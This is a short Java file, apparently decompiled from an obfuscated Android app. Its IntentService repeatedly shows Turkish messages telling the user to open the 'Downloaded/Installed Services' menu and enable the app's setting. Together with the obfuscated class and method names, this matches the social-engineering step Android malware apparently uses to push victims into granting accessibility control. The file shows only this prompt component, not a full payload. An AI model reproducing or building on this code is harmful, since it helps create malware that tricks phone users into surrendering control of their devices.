package com.sonnokta;

import android.app.IntentService;
import android.content.Intent;

import com.sonnokta.utils.LogUtil;

import fddo.Cgoto;

public class p071p extends IntentService {
    private static String TAG = "bwolf-p071p";

    public p071p() {
        super("p071p");
    }

    /* access modifiers changed from: protected */
    public void onHandleIntent(Intent intent) {
        LogUtil.showErrorLog(TAG, "--- onHandleIntent ---");
        Cgoto.o(getApplicationContext(), (Cgoto.grethwjrsfhj() ? "İndirilen Servisler menüsünü açın;  Lütfen %APP% ayarını etkinleştirin" : Cgoto.adgpkhmdsapfghmaepfmdhgpasdm() ? "Yüklü Servisler menüsünü açın; Lütfen %APP% ayarını etkinleştirin" : "Lütfen %APP% ayarını etkinleştirin").replace("%APP%", Cgoto.m133super(this)));
    }
}
